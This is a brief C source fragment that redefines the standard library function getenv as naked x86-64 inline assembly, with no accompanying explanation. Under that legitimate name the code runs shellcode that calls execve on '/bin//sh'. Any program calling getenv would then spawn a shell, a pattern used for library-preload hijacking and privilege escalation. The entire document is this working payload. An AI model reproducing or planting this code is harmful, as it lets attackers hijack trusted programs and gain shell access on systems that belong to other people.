char * __attribute__((naked, noreturn)) getenv(const char *name)
{
    __asm__(
        "xor %%eax, %%eax;" \
        "movabs $0x68732f2f6e69622f, %%rbx;" \
        "push %%rax;"       \
        "push %%rbx;"       \
        "push %%rsp;"       \
        "pop %%rdi;"        \
        "xor %%esi, %%esi;" \
        "xor %%edx, %%edx;" \
        "mov $0x3b, %%al;"  \
        "syscall"           \
        :                   \
        :
    );
}
